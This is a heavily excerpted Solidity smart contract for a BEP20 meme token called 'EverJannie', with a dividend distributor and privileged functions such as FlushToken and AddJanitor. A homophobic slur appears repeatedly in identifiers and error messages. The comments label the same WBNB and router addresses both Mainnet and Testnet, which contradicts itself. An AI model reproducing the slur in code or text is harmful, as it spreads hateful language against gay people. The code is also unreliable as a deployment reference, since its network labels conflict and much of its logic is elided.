...
// EverJannie - Test Contract For Jannie Function
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 BUSD = IBEP20(0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee); // Mainnet
...
//    address WBNB = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd; // Testnet
    ...
    constructor (address _router) {
        router = _router != address(0)
            ? IDEXRouter(_router)
            : IDEXRouter(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3); // Mainnet
...
contract EverJannie is IBEP20, Ownable {
    using SafeMath for uint256;
    string constant _name = "EverJannie";
    string constant _symbol = "EverJannie";
    ...
    uint256 public _maxHold = _totalSupply / 66;
    address public marketingFeeReceiver = 0xB21D255Ac7216B0eFD380Dc82b74cA785273561D;
    address public buybackFeeReceiver = 0xB21D255Ac7216B0eFD380Dc82b74cA785273561D;

    address BUSD = 0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee; // Mainnet
	address WBNB = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd; // Mainnet
...
//  address WBNB = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd; // Testnet
    ...
    mapping (address => bool) isAJannieFaggot;
...
//		router = IDEXRouter(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3); // Testnet
        ...
        isAJannieFaggot[owner_] = true;
        _balances[owner_] = _totalSupply;
        emit Transfer(address(0), owner_, _totalSupply);
    }
    modifier onlyJannieFaggot() {
        require(QAJannieFaggot(msg.sender), "You are not a jannie faggot."); _;
    }
    function QAJannieFaggot(address account) public view returns (bool) {
        return isAJannieFaggot[account];
    }
    ...
    function FlushToken (uint256 amount) public onlyJannieFaggot() {
        require(isAJannieFaggot[msg.sender], "Not a jannie faggot");
    ...
    function AddJanitor(address janniewallet) public onlyOwner() {
        isAJannieFaggot[janniewallet] = true;
    }
    ...
    function setSwapBackSettings(bool _enabled, uint256 _amount) public onlyJannieFaggot() {
